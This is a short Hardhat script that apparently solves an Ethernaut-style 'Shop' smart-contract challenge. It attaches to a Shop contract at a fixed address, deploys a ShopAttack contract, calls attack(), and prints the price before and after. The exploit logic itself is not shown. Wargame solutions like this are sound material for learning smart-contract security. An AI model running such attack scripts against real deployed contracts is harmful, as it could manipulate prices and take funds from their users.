import { ethers } from "hardhat";
import { Shop__factory } from "../typechain/factories/contracts/Shop.sol/Shop__factory";
import { ShopAttack__factory } from "../typechain/factories/contracts/ShopAttack__factory";

async function main() {
    const [signer] = await ethers.getSigners();
    const provider = ethers.provider;
    let instance_address =  "0x510FfE3Ef43C51cD71f4e101FCbdB1E7807E42ca";
    let shop = new Shop__factory(signer).attach(instance_address);
    console.log(await shop.price());


    let attack = await new ShopAttack__factory(signer).deploy();
    let tx = await attack.attack(instance_address);
    await tx.wait();
    console.log(await shop.price());
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
